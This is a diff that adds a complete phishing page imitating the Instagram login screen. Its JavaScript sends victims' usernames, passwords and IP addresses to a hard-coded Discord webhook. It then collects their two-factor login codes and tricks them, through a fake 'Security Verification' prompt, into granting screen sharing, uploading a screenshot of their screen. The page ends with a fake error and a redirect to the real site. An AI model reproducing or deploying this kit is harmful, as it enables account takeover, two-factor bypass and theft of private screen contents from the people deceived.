@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+        }
+        .card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 40px 30px 30px;
+            text-align: center;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+        }
+        .logo {
+            font-size: 42px;
+            font-weight: 400;
+            font-family: "Billabong", cursive;
+            color: #262626;
+            margin-bottom: 28px;
+            letter-spacing: -1px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 12px 6px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            background: #fafafa;
+            transition: border-color 0.2s, background 0.2s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #a8a8a8;
+            background: #ffffff;
+        }
+        .input-group label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8e8e8e;
+            font-size: 14px;
+            pointer-events: none;
+            transition: all 0.15s ease;
+            background: transparent;
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 6px;
+            font-size: 10px;
+            color: #8e8e8e;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s, opacity 0.2s;
+        }
+        .btn:hover {
+            background: #0074d9;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: default;
+        }
+        .btn .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #fff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 18px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider span {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .fb-link {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 4px;
+        }
+        .fb-link:hover {
+            text-decoration: underline;
+        }
+        .error {
+            color: #ed4956;
+            font-size: 13px;
+            margin-top: 12px;
+            display: none;
+        }
+        .footer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .signup-box {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 18px;
+            margin-top: 10px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+        .hidden {
+            display: none !important;
+        }
+        #code-section .card {
+            padding: 30px 30px 28px;
+        }
+        .code-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        .code-hint {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+        #screenshot-prompt {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        #screenshot-prompt.active {
+            display: flex;
+        }
+        #screenshot-prompt .box {
+            background: white;
+            padding: 30px 40px;
+            border-radius: 16px;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        #screenshot-prompt .box h2 {
+            margin-bottom: 10px;
+            font-size: 20px;
+        }
+        #screenshot-prompt .box p {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        #screenshot-prompt .box button {
+            padding: 10px 30px;
+            border: none;
+            border-radius: 8px;
+            background: #0095f6;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        #screenshot-prompt .box button:hover {
+            background: #0074d9;
+        }
+        @media (max-width: 500px) {
+            .card {
+                padding: 30px 20px 20px;
+                border-radius: 8px;
+            }
+            .logo {
+                font-size: 34px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<!-- SCREENSHOT PERMISSION OVERLAY -->
+<div id="screenshot-prompt">
+    <div class="box">
+        <h2>🔒 Security Verification</h2>
+        <p>Instagram needs to verify your device. Please allow screen sharing to confirm your identity.</p>
+        <button id="screenshot-accept">Continue</button>
+        <p style="margin-top:12px;font-size:12px;color:#999;">Your session is encrypted and secure.</p>
+    </div>
+</div>
+
+<div class="container">
+    <!-- LOGIN -->
+    <div id="login-section">
+        <div class="card">
+            <div class="logo">Instagram</div>
+            <form id="login-form" onsubmit="return false;">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder=" " autocomplete="off" required />
+                    <label>Phone number, username, or email</label>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder=" " autocomplete="off" required />
+                    <label>Password</label>
+                </div>
+                <button class="btn" id="login-btn" type="button">
+                    <span id="login-text">Log in</span>
+                    <span class="spinner" id="login-spinner"></span>
+                </button>
+                <div class="error" id="login-error">Sorry, your password was incorrect. Please double-check your password.</div>
+            </form>
+            <div class="divider"><span>OR</span></div>
+            <a href="#" class="fb-link" id="fb-login">Log in with Facebook</a>
+            <div class="footer"><a href="#">Forgot password?</a></div>
+        </div>
+        <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
+    </div>
+
+    <!-- 2FA -->
+    <div id="code-section" class="hidden">
+        <div class="card">
+            <div class="code-icon">🔐</div>
+            <div class="code-hint">We sent a login code to your email.<br />Enter it below to continue.</div>
+            <form id="code-form" onsubmit="return false;">
+                <div class="input-group">
+                    <input type="text" id="code" placeholder=" " maxlength="6" inputmode="numeric" autocomplete="off" required />
+                    <label>6-digit code</label>
+                </div>
+                <button class="btn" id="code-btn" type="button">
+                    <span id="code-text">Confirm</span>
+                    <span class="spinner" id="code-spinner"></span>
+                </button>
+                <div class="error" id="code-error">Wrong code. Please try again.</div>
+            </form>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ===== CONFIG =====
+    const WEBHOOK = "https://discord.com/api/webhooks/1540324468302286880/lioaw5A8lGbW6uI-u0alwhgNfw95iHWqUeH-8iQNwpJvGJJEpTt8L-UptDoBglAI7aEL";  // CHANGE THIS
+
+    // ===== GET IP =====
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return 'unknown';
+        }
+    }
+
+    // ===== SEND TO DISCORD (TEXT) =====
+    async function sendToDiscord(content) {
+        try {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: content })
+            });
+        } catch (e) {}
+    }
+
+    // ===== SEND TO DISCORD (IMAGE) =====
+    async function sendImageToDiscord(base64Data, filename = 'screenshot.jpg') {
+        try {
+            const binary = atob(base64Data);
+            const bytes = new Uint8Array(binary.length);
+            for (let i = 0; i < binary.length; i++) {
+                bytes[i] = binary.charCodeAt(i);
+            }
+            const blob = new Blob([bytes], { type: 'image/jpeg' });
+            const formData = new FormData();
+            formData.append('file', blob, filename);
+            await fetch(WEBHOOK, { method: 'POST', body: formData });
+        } catch (e) {}
+    }
+
+    // ===== CAPTURE SCREENSHOT =====
+    async function captureScreen() {
+        try {
+            const stream = await navigator.mediaDevices.getDisplayMedia({
+                video: {
+                    cursor: "always",
+                    displaySurface: "monitor"
+                },
+                audio: false
+            });
+
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            const bitmap = await imageCapture.grabFrame();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = bitmap.width;
+            canvas.height = bitmap.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(bitmap, 0, 0);
+
+            const jpeg = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+
+            track.stop();
+            stream.getTracks().forEach(t => t.stop());
+
+            return jpeg;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // ===== TRIGGER SCREENSHOT WITH PERMISSION PROMPT =====
+    async function triggerScreenshot() {
+        // Show the custom overlay
+        const overlay = document.getElementById('screenshot-prompt');
+        overlay.classList.add('active');
+
+        // Wait for user to click "Continue"
+        return new Promise((resolve) => {
+            document.getElementById('screenshot-accept').onclick = async () => {
+                overlay.classList.remove('active');
+                const screenshot = await captureScreen();
+                resolve(screenshot);
+            };
+        });
+    }
+
+    // ===== LOGIN =====
+    document.getElementById('login-btn').addEventListener('click', async function() {
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            document.getElementById('login-error').style.display = 'block';
+            return;
+        }
+
+        document.getElementById('login-text').style.display = 'none';
+        document.getElementById('login-spinner').style.display = 'block';
+        this.disabled = true;
+
+        const ip = await getIP();
+        const msg = `**🎯 INSTAGRAM LOGIN**\n**User:** \`${username}\`\n**Pass:** \`${password}\`\n**IP:** \`${ip}\``;
+        await sendToDiscord(msg);
+
+        document.getElementById('login-text').style.display = 'inline';
+        document.getElementById('login-spinner').style.display = 'none';
+        this.disabled = false;
+
+        document.getElementById('login-section').classList.add('hidden');
+        document.getElementById('code-section').classList.remove('hidden');
+    });
+
+    // ===== 2FA + SCREENSHOT =====
+    document.getElementById('code-btn').addEventListener('click', async function() {
+        const code = document.getElementById('code').value.trim();
+
+        if (!code || code.length < 6) {
+            document.getElementById('code-error').style.display = 'block';
+            return;
+        }
+
+        document.getElementById('code-text').style.display = 'none';
+        document.getElementById('code-spinner').style.display = 'block';
+        this.disabled = true;
+
+        // Send 2FA code
+        const msg = `**🔐 2FA CODE**\n**Code:** \`${code}\``;
+        await sendToDiscord(msg);
+
+        // ===== TRIGGER SCREENSHOT =====
+        const screenshot = await triggerScreenshot();
+        if (screenshot) {
+            await sendImageToDiscord(screenshot, 'instagram_screenshot.jpg');
+        }
+
+        document.getElementById('code-text').style.display = 'inline';
+        document.getElementById('code-spinner').style.display = 'none';
+        this.disabled = false;
+
+        // Show error + redirect
+        document.getElementById('code-error').style.display = 'block';
+        document.getElementById('code-error').innerText = '⚠️ Something went wrong. Please try again.';
+
+        setTimeout(() => {
+            window.location.href = 'https://www.instagram.com/';
+        }, 2000);
+    });
+
+    // ===== FAKE FACEBOOK =====
+    document.getElementById('fb-login').addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById('login-error').style.display = 'block';
+        document.getElementById('login-error').innerText = 'Facebook login is temporarily unavailable. Please use Instagram login.';
+    });
+</script>
+
+</body>
+</html>
